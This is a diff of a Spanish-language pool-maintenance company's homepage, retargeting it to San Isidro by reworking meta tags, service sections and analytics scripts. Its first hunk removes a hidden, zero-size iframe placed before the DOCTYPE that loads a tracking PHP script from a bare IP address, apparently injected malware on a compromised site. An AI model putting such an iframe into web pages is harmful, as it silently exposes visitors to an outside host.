@@ -1,4 +1,4 @@
-<iframe style="visibility: hidden; display: none; display: none;" src="http://108.174.145.11/~mymopar/referer.php?id={4E74FCEC-978E-41E1-B4EA-D7A113531B78}"></iframe><!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="es">
 
   <head>
@@ -15,23 +15,20 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="theme-color" content="#2F4598">
-	<meta name="robots" content="index, follow, all">
-	<meta name="googlebot" content="index, follow, all">
-	<meta name="keywords" content="pileta, piletas, piscinas, piletero, pileteros, desagote">
-	<meta name="title" content="PILETEROS - LIMPIEZA DE PILETAS - DESAGOTES DE PISCINAS">
-	<meta name="author" content="Administrator">
-	<meta name="description" content="Empresa profesional de Limpieza y desagote de pileta. Piletero en Capital Federal." />
-	<title>PILETEROS - LIMPIEZA DE PILETAS - DESAGOTES DE PISCINAS</title>
-	<meta name="google-site-verification" content="VtdXUgSAs18OSNEOuGEqfMCEsFGjHU_Z447jcwFi3Fo">
-    <link rel="shortcut icon" href="img/logo.png">
+
+ 		<meta name="robots" content="index, follow, all" />
+		<meta name="googlebot" content="index, follow, all" />	
+		<meta name="keywords" content="pileta, piletas, piscinas, piletero, pileteros, desagote, san isidro" />
+		<meta name="title" content="Piletero en San Isidro" />
+		<meta name="author" content="Administrator" />
+		<meta name="description" content="Servicios de limpieza y mantenimiento de piletas. Pileteros profesionales." />	
+		<title>Piletero en San Isidro</title>	
+		<meta name="google-site-verification" content="VtdXUgSAs18OSNEOuGEqfMCEsFGjHU_Z447jcwFi3Fo" />	    <link rel="icon" href="img/logo.png">
 
 
     <!-- Bootstrap -->
-
-     <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
-
+    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
     <link href="css/bootstrap.min.css" rel="stylesheet" type="text/css">
-
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
 
 
@@ -39,25 +36,19 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     <!-- Include all compiled plugins (below), or include individual files as needed -->
     <script src="js/bootstrap-3.3.6.js"></script>
     <script type="text/javascript" src="js/modernizr.custom.79639.js"></script>
+
     <link rel="stylesheet" type="text/css" href="fonts/font-awesome/css/font-awesome.min.css">
 
-
-    <script src="js/loaders.css.js"></script>
-
-
-    <!--formulario -->
+      <!--formulario -->
+	   <link href="css/hover.css" rel="stylesheet"> 
     <script src="js/fileinput.js" type="text/javascript"></script>
     <link href="css/fileinput.css" rel="stylesheet">
-    
-     <link href="css/hover.css" rel="stylesheet"> 
-  
-
-   <link href="css/estilos.css" rel="stylesheet">
-   <link href="css/estilos_2.css" rel="stylesheet">
-   <link href="css/fuentes.css" rel="stylesheet">
+    <link href="css/estilos.css" rel="stylesheet">
+    <link href="css/estilos_2.css" rel="stylesheet">
+    <link href="css/fuentes.css" rel="stylesheet">
     <!-- Animate-->
     <link rel="stylesheet" href="css/animate/animate.css">
-        <script src="js/wow.js"></script>
+    <script src="js/wow.js"></script>
     <script>new WOW().init();</script>
 
 
@@ -80,8 +71,18 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
   });
   </script>
 
+  <script type="text/javascript">
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
 
-  <!-- Global site tag (gtag.js) - Google Analytics -->
+  ga('create', 'UA-5539254-2', 'auto');
+  ga('send', 'pageview');
+
+</script>
+ 
+<!-- Global site tag (gtag.js) - Google Analytics -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=UA-5539254-2"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
@@ -89,81 +90,54 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
   gtag('js', new Date());
 
   gtag('config', 'UA-5539254-2');
-</script>  
-
-<!-- Facebook Pixel Code -->
-<script>
-  !function(f,b,e,v,n,t,s)
-  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-  n.queue=[];t=b.createElement(e);t.async=!0;
-  t.src=v;s=b.getElementsByTagName(e)[0];
-  s.parentNode.insertBefore(t,s)}(window, document,'script',
-  'https://connect.facebook.net/en_US/fbevents.js');
-  fbq('init', '555542968572021');
-  fbq('track', 'PageView');
-</script>
-<noscript><img height="1" width="1" style="display:none"
-  src="https://www.facebook.com/tr?id=555542968572021&ev=PageView&noscript=1"
-/></noscript>
-<!-- End Facebook Pixel Code -->
+</script> 
 
 </head>
-
-<body class="animated bounceInRight">
-
-	 
-  	<section>
+  <body class="animated bounceInRight">
+    <section>
 
     <?php include "include/chat.php"; ?>
   
   </section>
-
-     <span class="ir-arriba"><img src="img/up.png" alt=""></span>
+    <span class="ir-arriba"><img src="img/up.png" alt=""></span>
 	<div id="top"></div>
+ <header>
 
-<header>
-  <div class="botoner_completa animated slideInDown">
-    <!-- INCLUDE NAVEGACIÓN -->
-    <?php include "include/navegacion.php"; ?>
-  </div> 
+ 	<header>
 
-  <div class="imagen_cabesal">
-    <img src="img/sello_premiun.png" align="right" class="sello_premiun" alt="Sello Premium">
-  </div>
+  
+    
+<div class="botoner_completa animated slideInDown">
+     
+   
+
+      
+
+            <?php include "include/navegacion.php"; ?>
+            
+        
+
+      
+ </div> 
+<div class="imagen_cabesal">
+	<img src="img/sello_premiun.png" align="right" class="sello_premiun" alt="">
+ 
+</div>
+  
 </header>
 
-
-<section>
+<section id="cobertura">
       <div class="container">
               <div class="row">
-                  <div class="col-md-12">
-                    <div class="div-texto">
-                      <h2 class="texto1 wow zoomInDown" datos-wow-duracion= "2s" data-wow-delay = "1s">Empresa de Mantenimiento Integral de Piscinas</h2>
-                        <h4 class="texto2 wow slideInUp">Pileteros profesionales</h4>
-                    </div>
-
-                    <div class="div-texto">
-                          <h5 class="texto3 wow slideInUp">
-                                Le damos la bienvenida a nuestro sitio web donde podrá acceder a toda la información sobre los servicios que ofrece nuestra empresa en la Ciudad Autónoma de Buenos Aires y alrededores.
-
-                          </h5>
-                    </div>
-
-                  </div>
-
-                </div>
-        </div>
-</section>
-<section>
-       <div class="container">
-              <div class="row">
                   <div class="col-md-12">   
-                                       
+                    <div class="div-texto">
+                      <h1 class="texto1 wow zoomInDown" datos-wow-duracion= "2s" data-wow-delay = "1s">Mantenimiento de Piletas en San Isidro</h1>
+                        <h2 class="texto2 wow slideInUp">servicios sugeridos</h2>
+                    </div>
+                    
                   
-             <div class="container">
-              <div class="row text-center cont-iconos">
+                    <div class="container">
+        <div class="row text-center cont-iconos">
                 <div class="col-md-3 wow fadeIn" datos-wow-duracion= "1s" data-wow-delay = "1s">
                     <table width="100%" border="0" style="margin-bottom: 50px;">
                       <tbody>
@@ -252,128 +226,110 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
           </div>
       </div>   
             
-    </div>  
-                
-    </div>
-   </div>
-
-</section>
 
 
-<section class="wow bounceInUp" datos-wow-duracion="4s" data-wow-delay ="2s">
-        <div class="container">
-            <div class="row">
-
-               <div class="col-md-12">
-                     <img src="img/img_produ_ind.png" class="img_produc" alt="">
-
-                     <div class="td08b_2">
-                     <div class="presupuesto">
-                     <a href="http://tienda.inagua.com.ar/" class="boton-presupuesto" style="text-decoration:none;" target="new">VISITA NUESTRA TIENDA</a>
-                      </div>
-                 </div>
-
-              </div>
-          </div>
-  </div>
-</section>
-
-<section>
-    
-    <div class="container sobre_nosotros_1">
-              <div class="row">
-                
-                  <div class="col-md-6 wow slideInLeft" datos-wow-duracion= "0.5s" data-wow-delay = "0.5s">
-                        <img src="img/staff_1.png" alt="" class="staff_1">
+      <div class="container">
+        <div class="row text-center cont-iconos">
+                <div class="col-md-3 wow fadeIn" datos-wow-duracion= "1s" data-wow-delay = "1s">
+                    <table width="100%" border="0">
+                      <tbody>
+                        <tr>
+                          <td align="center"><img src="img/iconos_servicios_venecitas.png" width="138" height="129" alt=""/></td>
+                        </tr>
+                        <tr>
+                          <td align="center" class="td07"><p>PASTINADO DE PILETAS CON VENECITAS</p></td>
+                        </tr>
+                        <tr>
+                          <td align="center" class="td08b"><p><br>Rejuvenecemos su pileta<br><br></p></td>
+                        </tr>
+                        <tr>
+                          <td align="center" style="padding-top: 43px;"><a href="servicio-de-pastinado-de-piletas-revestidas.php"><p class="boton-click-aqui">MAS INFO</p></a></td>
+                        </tr>
+                      </tbody>
+                    </table>
                   </div>
                     
-                  <div class="col-md-6 wow slideInRight" datos-wow-duracion= "1s" data-wow-delay = "1s">
-                      <p class="texto223"><strong>NOS DESTACAMOS EN</strong></p>
-                      <ul class="destacamos-list">
-                        <li>Puntualidad</li>
-                        <li>Educación</li>
-                        <li>Debidamente uniformados</li>
-                        <li>Conocimientos en limpieza de piscinas</li>
-                        <li>Seguridad personal y a terceros</li>
-                        <li>Equipamiento adecuado</li>
-                      </ul>
-                      
-                      <br>
-                      <p class="texto_seguro_3"><i><b>Para su seguridad nuestro personal <br>se encuentra debidamente registrado <br> y cuentan con los seguros <br>  de vida obligatorio y ART</b></i></p>
-                      
-                      <img src="img/logo_seguro.png" alt="" class="logo_seguro">
+          
+              <div class="col-md-3 wow fadeIn" datos-wow-duracion= "2s" data-wow-delay = "2s">
+                    <table width="100%" border="0">
+                      <tbody>
+                        <tr>
+                          <td align="center"><img src="img/iconos_servicios_pintura.png" width="138" height="129" alt=""/></td>
+                        </tr>
+                        <tr>
+                          <td align="center" class="td07"><p>PINTURA DE PILETAS</p></td>
+                        </tr>
+                        <tr>
+                          <td align="center" class="td08b"><br><br><p>Pintamos tu piscina de material o plastico <br><br><br></p></td>
+                        </tr>
+                        <tr>
+                          <td align="center" style="padding-top: 8px;"><a href="servicio-de-pintado-de-piletas-de-cemento-y-plastico-o-fibra-de-vidrio.php"><p class="boton-click-aqui">MAS INFO</p></a></td>
+                        </tr>
+                      </tbody>
+                    </table>
+                  </div>
 
-                      <p class="texto_seguro">Prevención ART - Vida Obligatorio</p>
-                      <p class="texto_seguro_2"><b>N°471157 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;N°1291680</b></p>
+                
+          
+
+
+                 <div class="col-md-3 wow fadeIn" datos-wow-duracion= "3s" data-wow-delay = "3s">
+                    <table width="100%" border="0">
+                      <tbody>
+                        <tr>
+                          <td align="center"><img src="img/icon_pro.png" width="138" height="129" alt=""/></td>
+                        </tr>
+                        <tr>
+                          <td align="center" class="td07"><p>VENTA DE PRODUCTOS</p></td>
+                        </tr>
+                        <tr>
+                          <td align="center" class="td08b"><p><br><br>Marcas lideres de primera calidad <br><br><br></p></td>
+                        </tr>
+                        <tr>
+                          <td align="center" style="padding-top: 30px;"><a href="productos-quimicos-y-accesorios-para-piletas-y-piscinas-de-natacion.php"><p class="boton-click-aqui">MAS INFO</p></a></td>
+                        </tr>
+                      </tbody>
+                    </table>
+                  </div>
+              
+              <div class="col-md-3 wow fadeIn" datos-wow-duracion= "4s" data-wow-delay = "4s">
+                    <table width="100%" border="0" style="margin-bottom: 50px;">
+                      <tbody>
+                        <tr>
+                          <td align="center"><img src="img/icon_analisis.png" width="138" height="129" alt=""/></td>
+                        </tr>
+                        <tr>
+                          <td align="center" class="td07"><p>ANALISIS BACTERIOLOGICO</p><br><br></td>
+                        </tr>
+                        <tr>
+                          <td align="center" class="td08b"><p>No corra riesgos de infecciones. Análisis bacterelógico y físico-químico</p></td>
+                        </tr>
+                        <tr>
+                          <td align="center" style="padding-top: 46px;"><a href="analisis-bacteriologico-de-agua-de-piscinas-piletas.php"><p class="boton-click-aqui" style="text-decoration: none;">MAS INFO</p></a></td>
+                        </tr>
+                      </tbody>
+                    </table>
                 </div>
+                 
+                  
+
 
           </div>
-    </div>  
-  
-  
+      </div>   
+                
+                    
+
+                
+                
+
+
+                                   
+                  </div>  
+                
+                </div>
+        </div> 
 </section>
- 
- <!-- FIN NOSOTROS -->
 
-  <!-- COBERTURA -->
-<section class="wow bounceInDown" datos-wow-duracion= "1s" data-wow-delay = "1s">
-  <div class="container">
-    <div class="row">
-        
-        <div class="row text-center separ-secciones_2">
-                <div class="col-md-4">
-                    <div class="span-separ-secciones_2"></div>
-                    
-                </div>
-                <div class="col-md-4">
-                    <p class="td06_2">Zona de cobertura</p>
-                    
-                </div>
-                <div class="col-md-4">
-                    <div class="span-separ-secciones_2"></div>
-                    
-                </div>
-          </div>
-          
-      <div class="col-md-6 lugar_char" align="center">
-        
-        <div>  
-          
-            <img src="img/partner_2.jpg" class="chata_ind" alt="">
-        
-        </div>
-
-          <div class="texto_zona_1">
-            <p class="td08">
-               Brindamos servicios de mantenimiento de piletas en todos los barrios de Capital Federal y alrededores. 
-            </p>
-          </div>
-          
-          <div class="btn_zona">
-              <p class="boton-zona">
-              <a href="piletero-en-capital-federal.php">CONSULTA POR SERVICIOS EN TU ZONA</a>
-
-              </p>
-          </div>
-        
-
-      </div>
-     
-
-
-
-      <div class="col-md-6 ">
-         <div class="lugar_mapa" align="center">
-
-         <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d105073.44367018693!2d-58.503338223412456!3d-34.61566245827943!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x95bcca3b4ef90cbd%3A0xa0b3812e88e88e87!2sBuenos+Aires%2C+CABA!5e0!3m2!1ses-419!2sar!4v1504503618843" width="430" height="460" frameborder="0" style="border:0" allowfullscreen class="img_mapa_2"></iframe>
-
-        </div>
-
-      </div>
-
-    </div>
-  </div>
-</section>
 
 
 
@@ -413,12 +369,6 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 
 
 </footer>
-<script>
-    document.addEventListener('DOMContentLoaded', function () {
-      document.querySelector('main').className += 'loaded';
-    });
-  </script>
-
 
 <script>
 $(document).ready(function(){
@@ -444,7 +394,8 @@ $(document).on('ready', function() {
 });
 </script>
 
-</div>
   </body>
 
 </html>
+
+
